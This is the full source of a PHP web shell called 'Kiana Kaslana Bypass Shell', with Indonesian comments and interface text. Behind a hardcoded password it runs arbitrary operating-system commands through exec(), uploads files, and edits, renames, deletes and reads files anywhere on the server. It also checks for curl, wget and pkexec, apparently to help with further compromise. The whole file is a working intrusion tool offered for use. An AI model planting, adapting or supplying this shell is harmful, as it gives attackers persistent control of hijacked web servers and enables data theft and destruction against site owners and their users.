<?php
// Mulai session
session_start();

// Tentukan password yang benar
$passwordBenar = "admin"; // Ganti dengan password yang kamu inginkan

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Periksa apakah pengguna sudah login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === $passwordBenar) {
        $_SESSION['logged_in'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Masukkan Password</title>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background: url("https://upload-os-bbs.hoyolab.com/upload/2023/02/17/0e766e5098b10610d85c12041b9d59fd_8787942535884375101.png") no-repeat center center fixed;
                    background-size: cover;
                    font-family: "Arial", sans-serif;
                }
                .login-container {
                    background: rgba(20, 20, 20, 0.9);
                    padding: 20px;
                    border-radius: 10px;
                    box-shadow: 0 0 15px rgba(153, 50, 204, 0.2);
                    text-align: center;
                    width: 300px;
                }
                .login-container h2 {
                    margin-bottom: 20px;
                    color: #9932CC;
                }
                .login-container input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 15px;
                    border: 1px solid #9932CC;
                    border-radius: 8px;
                    box-sizing: border-box;
                    background-color: rgba(40, 40, 40, 0.8);
                    color: #9932CC;
                }
                .login-container input[type="submit"] {
                    background-color: #9932CC;
                    color: #ffffff;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 8px;
                    cursor: pointer;
                    font-size: 16px;
                }
                .login-container input[type="submit"]:hover {
                    background-color: #7B258C;
                }
                .error {
                    color: #ff3333;
                    margin-top: 10px;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Masukkan Password</h2>
                <form method="post">
                    <input type="password" name="password" placeholder="Ketik password di sini" required>
                    <input type="submit" value="Masuk">
                </form>
                <?php if (isset($_POST['password'])): ?>
                    <p class="error">Password salah! Coba lagi.</p>
                <?php endif; ?>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kiana Kaslana Bypass Shell</title>
    <style>
        body {
            font-family: "Arial", sans-serif;
            background: url("https://upload-os-bbs.hoyolab.com/upload/2023/02/17/0e766e5098b10610d85c12041b9d59fd_8787942535884375101.png") no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            padding: 20px;
            color: #9932CC;
            min-height: 100vh;
        }
        h1 {
            text-align: left;
            color: #9932CC;
            text-shadow: 2px 2px 4px rgba(153, 50, 204, 0.3);
            margin-bottom: 20px;
            padding-left: 20px;
        }
        p {
            color: #9932CC;
            text-align: left;
            margin: 10px 0;
            padding-left: 20px;
        }
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin: 20px 0;
            background-color: rgba(20, 20, 20, 0.9);
            box-shadow: 0 0 15px rgba(153, 50, 204, 0.2);
            border-radius: 10px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333333;
        }
        th {
            background-color: #1a1a1a;
            color: #9932CC;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }
        tr:last-child td:first-child {
            border-bottom-left-radius: 10px;
        }
        tr:last-child td:last-child {
            border-bottom-right-radius: 10px;
        }
        tr:hover {
            background-color: rgba(153, 50, 204, 0.1);
        }
        a, button {
            padding: 6px 12px;
            text-decoration: none;
            color: #ffffff;
            background-color: #9932CC;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            display: inline-block;
            margin: 0 5px;
            transition: background-color 0.3s ease;
        }
        a:hover, button:hover {
            background-color: #7B258C;
        }
        .form-container, .file-content {
            margin: 20px 0;
            background: rgba(20, 20, 20, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(153, 50, 204, 0.2);
            width: 100%;
            box-sizing: border-box;
        }
        .server-info {
            margin: 20px 0;
            background: rgba(20, 20, 20, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(153, 50, 204, 0.2);
            width: 100%;
            box-sizing: border-box;
        }
        .form-container input[type="file"], 
        .form-container input[type="text"],
        .form-container textarea {
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #9932CC;
            border-radius: 8px;
            width: 100%;
            box-sizing: border-box;
            background-color: rgba(40, 40, 40, 0.8);
            color: #9932CC;
        }
        .form-container button {
            background-color: #9932CC;
            padding: 10px 20px;
            font-size: 16px;
        }
        .file-content textarea {
            width: 100%;
            height: 200px;
            padding: 10px;
            border: 1px solid #9932CC;
            border-radius: 8px;
            box-sizing: border-box;
            background-color: rgba(40, 40, 40, 0.8);
            color: #9932CC;
            resize: vertical;
        }
        .error, .success {
            padding: 10px;
            margin: 10px 0;
            border-radius: 8px;
            text-align: center;
            border: 2px solid #9932CC;
        }
        .error {
            background-color: rgba(255, 51, 51, 0.8);
            color: #ffffff;
        }
        .success {
            background-color: rgba(153, 50, 204, 0.3);
            color: #ffffff;
        }
        .perm-green { color: #00ff66; }
        .perm-red { color: #ff3333; }
        .emoji-icon {
            margin-right: 10px;
            font-size: 1.5em;
            color: #9932CC;
            vertical-align: middle;
        }
        .date-purple {
            color: #9932CC;
            font-weight: bold;
        }
        a.file-link, a.folder-link, a.path-link {
            background: none;
            padding: 0;
            color: #9932CC;
            text-decoration: underline;
        }
        a.file-link:hover, a.folder-link:hover, a.path-link:hover {
            color: #7B258C;
        }
        .server-info p {
            margin: 5px 0;
            color: #9932CC;
        }
        .status-on { color: #00ff66; font-weight: bold; }
        .status-off { color: #ff3333; font-weight: bold; }
        .upload-form-container {
            display: flex;
            justify-content: center;
            margin: 10px 0;
        }
        .upload-form {
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .button-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        .home-button, .command-button, .logout-button {
            padding: 10px 20px;
            background-color: #9932CC;
            border-radius: 8px;
            margin: 0 10px;
        }
        .home-button:hover, .command-button:hover, .logout-button:hover {
            background-color: #7B258C;
        }
        .command-form {
            background: rgba(20, 20, 20, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(153, 50, 204, 0.2);
            margin: 20px auto;
            width: 80%;
            max-width: 600px;
        }
        .command-form textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #9932CC;
            border-radius: 8px;
            box-sizing: border-box;
            background-color: rgba(40, 40, 40, 0.8);
            color: #9932CC;
            margin-bottom: 10px;
        }
        .command-form button {
            background-color: #9932CC;
            padding: 10px 20px;
            font-size: 16px;
        }
        .command-form button:hover {
            background-color: #7B258C;
        }
        .command-output {
            margin-top: 10px;
            padding: 10px;
            background-color: rgba(40, 40, 40, 0.8);
            border: 1px solid #9932CC;
            border-radius: 8px;
            color: #9932CC;
            white-space: pre-wrap;
        }
        .footer-text {
            margin-top: 20px;
            text-align: center;
            color: #000000;
            font-size: 14px;
            font-weight: bold;
        }
        .footer-text a {
            color: #000000;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <h1>Kiana Kaslana Bypass Shell</h1>

    <?php
    // Dapatkan direktori saat ini
    $currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(dirname(__FILE__));
    if ($currentDir === false || !is_dir($currentDir)) {
        $currentDir = realpath(dirname(__FILE__));
    }
    $rootDir = realpath(dirname(__FILE__));

    // Fungsi untuk menampilkan pesan
    function showMessage($message, $type = 'success') {
        echo "<div class='$type'>$message</div>";
    }

    // Fungsi untuk mendapatkan hak akses
    function getPermissions($filePath) {
        $perms = fileperms($filePath);
        $info = '';
        $info .= is_dir($filePath) ? 'd' : '-';
        $info .= ($perms & 0400) ? 'r' : '-';
        $info .= ($perms & 0200) ? 'w' : '-';
        $info .= ($perms & 0100) ? 'x' : '-';
        $info .= ($perms & 0040) ? 'r' : '-';
        $info .= ($perms & 0020) ? 'w' : '-';
        $info .= ($perms & 0010) ? 'x' : '-';
        $info .= ($perms & 0004) ? 'r' : '-';
        $info .= ($perms & 0002) ? 'w' : '-';
        $info .= ($perms & 0001) ? 'x' : '-';
        return $info;
    }

    // Fungsi untuk memformat ukuran file
    function formatSize($bytes) {
        if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
        elseif ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
        elseif ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
        else return $bytes . ' B';
    }

    // Handle upload file
    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
        $uploadPath = $currentDir . '/' . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadPath)) {
            showMessage("File berhasil diunggah!");
        } else {
            showMessage("Gagal mengunggah file.", "error");
        }
    }

    // Handle delete file/folder
    if (isset($_GET['delete'])) {
        $deletePath = realpath($currentDir . '/' . $_GET['delete']);
        if ($deletePath) {
            if (is_file($deletePath)) {
                unlink($deletePath);
                showMessage("File dihapus!");
            } elseif (is_dir($deletePath)) {
                rmdir($deletePath);
                showMessage("Folder dihapus!");
            } else {
                showMessage("Gagal menghapus.", "error");
            }
        }
    }

    // Handle rename file/folder
    if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldPath = realpath($currentDir . '/' . $_POST['old_name']);
        $newPath = $currentDir . '/' . $_POST['new_name'];
        if ($oldPath && rename($oldPath, $newPath)) {
            showMessage("Nama diganti!");
        } else {
            showMessage("Gagal ganti nama.", "error");
        }
    }

    // Handle edit file
    if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
        $editPath = realpath($currentDir . '/' . $_POST['edit_file']);
        if ($editPath && is_file($editPath)) {
            file_put_contents($editPath, $_POST['file_content']);
            showMessage("File diedit!");
        } else {
            showMessage("Gagal edit file.", "error");
        }
    }

    // Handle command execution
    $commandOutput = "";
    if (isset($_POST['linux_command'])) {
        $command = trim($_POST['linux_command']);
        if (!empty($command)) {
            exec($command . " 2>&1", $output, $return_var);
            $commandOutput = empty($output) ? "Perintah dijalankan, tidak ada output." : implode("\n", $output);
            if ($return_var !== 0) {
                $commandOutput = "Perintah gagal dengan kode $return_var:\n" . $commandOutput;
            }
        }
    }

    // Informasi server
    ?>
    <div class="server-info">
        <p><strong>Informasi OS:</strong> <?php echo htmlspecialchars(php_uname()); ?></p>
        <p><strong>Sistem Software:</strong> <?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Tidak tersedia'); ?></p>
        <p><strong>Versi PHP:</strong> <?php echo htmlspecialchars(phpversion()); ?></p>
        <p><strong>Curl:</strong> <?php echo function_exists('curl_version') ? '<span class="status-on">On</span>' : '<span class="status-off">Off</span>'; ?> | 
           <strong>Wget:</strong> <?php echo function_exists('exec') && @exec('which wget') ? '<span class="status-on">On</span>' : '<span class="status-off">Off</span>'; ?> | 
           <strong>Pkexec:</strong> <?php echo function_exists('exec') && @exec('which pkexec') ? '<span class="status-on">On</span>' : '<span class="status-off">Off</span>'; ?> | 
           <strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? '<span class="status-on">On</span>' : '<span class="status-off">Off</span>'; ?>
        </p>
        <div class="upload-form-container">
            <form method="post" enctype="multipart/form-data" class="upload-form">
                <input type="file" name="upload_file" required>
                <button type="submit">Upload Sekarang!</button>
            </form>
        </div>
    </div>

    <!-- Tombol navigasi -->
    <div class="button-container">
        <a href="?dir=<?php echo urlencode($rootDir); ?>" class="home-button">Home</a>
        <button class="command-button" onclick="toggleCommandForm()">Command</button>
        <a href="?logout=1" class="logout-button" onclick="return confirm('Yakin mau logout?')">Logout</a>
    </div>

    <?php
    // Tampilkan direktori saat ini
    $pathParts = explode('/', $currentDir);
    $pathLinks = [];
    $accumulatedPath = '';
    foreach ($pathParts as $part) {
        if (empty($part)) continue;
        $accumulatedPath .= '/' . $part;
        $pathLinks[] = '<a href="?dir=' . urlencode($accumulatedPath) . '" class="path-link">' . htmlspecialchars($part) . '</a>';
    }
    echo "<p>Direktori saat ini: /" . implode(' / ', $pathLinks) . "</p>";

    // Form command Linux
    ?>
    <div class="command-form" id="commandForm" style="<?php echo empty($commandOutput) ? 'display: none;' : 'display: block;'; ?>">
        <form method="post">
            <textarea name="linux_command" placeholder="Masukkan perintah Linux di sini" required></textarea>
            <button type="submit">Jalankan Perintah!</button>
        </form>
        <?php if (!empty($commandOutput)): ?>
            <div class="command-output"><?php echo htmlspecialchars($commandOutput); ?></div>
        <?php endif; ?>
    </div>

    <script>
        function toggleCommandForm() {
            const commandForm = document.getElementById('commandForm');
            commandForm.style.display = commandForm.style.display === 'none' ? 'block' : 'none';
        }
    </script>

    <?php
    // Daftar file dan folder
    $files = scandir($currentDir);
    $folders = [];
    $fileList = [];
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $filePath = $currentDir . '/' . $file;
        if (is_dir($filePath)) $folders[] = $file;
        else $fileList[] = $file;
    }
    sort($folders);
    sort($fileList);
    $sortedFiles = array_merge($folders, $fileList);

    echo "<table>";
    echo "<tr><th>Nama</th><th>Tipe</th><th>Tanggal Modifikasi</th><th>Hak Akses</th><th>Ukuran</th><th>Aksi</th></tr>";
    foreach ($sortedFiles as $file) {
        $filePath = $currentDir . '/' . $file;
        $type = is_dir($filePath) ? 'Folder' : 'File';
        $perms = getPermissions($filePath);
        $isWritable = is_writable($filePath);
        $permClass = $isWritable ? 'perm-green' : 'perm-red';
        $modDate = date('d M Y H:i:s', filemtime($filePath));
        $size = is_file($filePath) ? formatSize(filesize($filePath)) : '-';

        echo "<tr>";
        echo "<td>";
        if (is_dir($filePath)) {
            echo "<span class='emoji-icon'>📁</span> <a href='?dir=" . urlencode($filePath) . "' class='folder-link'>" . htmlspecialchars($file) . "</a>";
        } else {
            echo "<span class='emoji-icon'>📄</span> <a href='?view=" . urlencode($file) . "&dir=" . urlencode($currentDir) . "' class='file-link'>" . htmlspecialchars($file) . "</a>";
        }
        echo "</td>";
        echo "<td>$type</td>";
        echo "<td><span class='date-purple'>$modDate</span></td>";
        echo "<td><span class='$permClass'>$perms</span></td>";
        echo "<td>$size</td>";
        echo "<td>";
        if (is_file($filePath)) echo "<a href='?dir=" . urlencode($currentDir) . "&edit=" . urlencode($file) . "'>Edit</a> ";
        echo "<a href='?dir=" . urlencode($currentDir) . "&rename=" . urlencode($file) . "'>Ganti Nama</a> ";
        echo "<a href='?dir=" . urlencode($currentDir) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Yakin mau hapus $file?\")'>Hapus</a>";
        echo "</td>";
        echo "</tr>";
    }
    echo "</table>";

    // Tampilkan isi file
    if (isset($_GET['view']) && isset($_GET['dir'])) {
        $viewFile = realpath($currentDir . '/' . $_GET['view']);
        if ($viewFile && is_file($viewFile)) {
            $fileContent = @file_get_contents($viewFile);
            if ($fileContent !== false) {
                if (strpos(mime_content_type($viewFile), 'text/') === 0 || strpos($viewFile, '.php') !== false || strpos($viewFile, '.html') !== false) {
                    echo "<div class='file-content'><h3>Isi File: " . htmlspecialchars($_GET['view']) . "</h3><textarea readonly>" . htmlspecialchars($fileContent) . "</textarea></div>";
                } else {
                    showMessage("File ini bukan file teks dan tidak dapat ditampilkan.", "error");
                }
            } else {
                showMessage("Gagal membaca isi file.", "error");
            }
        }
    }

    // Form edit file
    if (isset($_GET['edit'])) {
        $editFile = realpath($currentDir . '/' . $_GET['edit']);
        if ($editFile && is_file($editFile)) {
            $content = file_get_contents($editFile);
            echo "<div class='form-container'><h3>Edit File: " . htmlspecialchars($_GET['edit']) . "</h3>
                  <form method='post'><textarea name='file_content' rows='10'>" . htmlspecialchars($content) . "</textarea><br>
                  <input type='hidden' name='edit_file' value='" . htmlspecialchars($_GET['edit']) . "'>
                  <button type='submit'>Simpan!</button></form></div>";
        }
    }

    // Form rename file/folder
    if (isset($_GET['rename'])) {
        echo "<div class='form-container'><h3>Ganti Nama: " . htmlspecialchars($_GET['rename']) . "</h3>
              <form method='post'><input type='hidden' name='old_name' value='" . htmlspecialchars($_GET['rename']) . "'>
              <input type='text' name='new_name' value='" . htmlspecialchars($_GET['rename']) . "' required>
              <button type='submit'>Ganti Sekarang!</button></form></div>";
    }
    ?>

    <div class="footer-text">Created By <a href="https://github.com/AlexSpedo168" target="_blank">AlexSpedo168</a></div>
</body>
</html>
